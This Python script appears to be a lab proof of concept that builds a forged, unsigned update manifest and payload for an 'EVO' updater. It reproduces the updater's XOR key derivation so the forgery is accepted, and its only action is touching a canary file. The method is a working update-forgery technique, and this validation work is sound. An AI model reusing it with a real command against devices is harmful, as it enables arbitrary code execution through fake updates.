#!/usr/bin/env python3
"""Build the fake-repository files for the lab-only forged-update validator.

The genuine EVO updater obfuscates its manifest with a repeating 20-byte XOR
key (0xA1*20 XOR the filename; the same rule as tools/xweb_evo_xor_extract.py)
instead of verifying a signature. This script fabricates an unsigned manifest
and payload whose only action is touching a unique harmless canary file. It
installs no RPM, reboots nothing, and writes no firmware.

Usage: build-forged-repo.py <output-dir> <canary-path>
"""

import sys
from pathlib import Path

XML_PREFIX = b'<?xml version="1.0" encoding="UTF-8"?>'


def derive_key(name):
    key = bytearray([0xA1] * 20)
    for index, byte in enumerate(name.encode("ascii")[:20]):
        key[index] ^= byte
    return bytes(key)


def xor_period(data, key):
    return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))


def main():
    if len(sys.argv) != 3:
        sys.exit(__doc__)
    out_dir = Path(sys.argv[1])
    canary = sys.argv[2]
    if not canary.startswith("/opt/log/EVO_FORGED_CANARY_"):
        sys.exit("canary must be a unique /opt/log/EVO_FORGED_CANARY_* path")
    out_dir.mkdir(parents=True, exist_ok=True)

    pkg_name = "CanaryPkg"
    pkg_ver = "9.9.9.LABCHECK"
    pkg_rel = "FORGED"
    pkg_ext = ".bin"
    pkg_file = f"{pkg_name}-{pkg_ver}-{pkg_rel}{pkg_ext}"
    cmd = f"/usr/bin/touch {canary}"

    payload_plain = b"LAB FORGED UPDATE PAYLOAD - harmless marker, never executed\n"
    payload_scrambled = xor_period(payload_plain, derive_key(f"{pkg_name}-{pkg_ver}-{pkg_rel}"))
    (out_dir / pkg_file).write_bytes(payload_scrambled)

    manifest = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<content>\n'
        '\t<evopacket>\n'
        f'\t\t<info name="{pkg_name}" version="{pkg_ver}" release="{pkg_rel}" '
        f'size="{len(payload_plain)}" ext="{pkg_ext}"/>\n'
        f'\t\t<action trans="I" reb="0" cmd="{cmd}"/>\n'
        '\t\t<evo vset="5.8.8.STANDARD.24-25902d"/>\n'
        '\t\t<desc>\n'
        '\t\t\t<en-US>Lab forged-update validation canary (harmless)</en-US>\n'
        '\t\t</desc>\n'
        '\t</evopacket>\n'
        '</content>\n'
    ).encode("ascii")

    assert manifest.startswith(XML_PREFIX)
    scrambled = xor_period(manifest, derive_key("evopack"))
    (out_dir / "evopack").write_bytes(scrambled)
    (out_dir / "evopack.plaintext.xml").write_bytes(manifest)

    assert xor_period(scrambled, derive_key("evopack")) == manifest
    assert xor_period(payload_scrambled, derive_key(f"{pkg_name}-{pkg_ver}-{pkg_rel}")) == payload_plain
    print(f"manifest: {len(manifest)} bytes plaintext, key {derive_key('evopack').hex()}")
    print(f"payload:  {pkg_file} {len(payload_plain)} bytes plaintext")
    print(f"cmd: {cmd}")


if __name__ == "__main__":
    main()
